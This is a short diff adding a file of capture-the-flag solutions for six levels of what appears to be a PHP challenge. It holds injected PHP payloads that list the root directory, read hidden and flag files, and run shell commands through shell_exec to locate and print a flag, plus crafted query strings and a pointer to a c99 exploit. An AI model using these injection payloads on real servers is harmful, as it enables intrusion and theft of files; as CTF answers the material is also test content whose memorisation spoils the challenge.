@@ -1,0 +1,48 @@
+level1:
+c99 exploit
+http://www.exploit-db.com/exploits/34025/
+
+
+level2:
+include_once('/flag.txt');
+
+
+level3:
+//Step 1
+$handle = opendir('/');
+    /* This is the correct way to loop over the directory. */
+    while (false !== ($entry = readdir($handle))) {
+        echo "$entry\n";
+    }
+
+//Step 2
+$handle = @fopen("/nopzyoucantguessmemyfriend.txt", "r");
+if ($handle) {
+    while (($buffer = fgets($handle, 4096)) !== false) {
+        echo $buffer;
+    }
+    if (!feof($handle)) {
+        echo "Error: unexpected fgets() fail\n";
+    }
+    fclose($handle);
+}
+
+
+level4:
+//Step 1 - Determine what binary can be used
+echo shell_exec('echo /* 2>&1');
+echo shell_exec('echo /bin/* 2>&1');
+echo shell_exec('/bin/find -h 2>&1');
+
+//step 2 - Find the flag
+echo shell_exec('/bin/find / -name flag.txt 2>&1');
+
+// Step 3 - Print the flag
+echo shell_exec('while read line; do echo "$line"; done < /thematrix/22/72/flag.txt');
+
+level5:
+a=-2&b=100&c=-2&d=-002
+
+level6: 
+a=0&b=100&c=%20
+
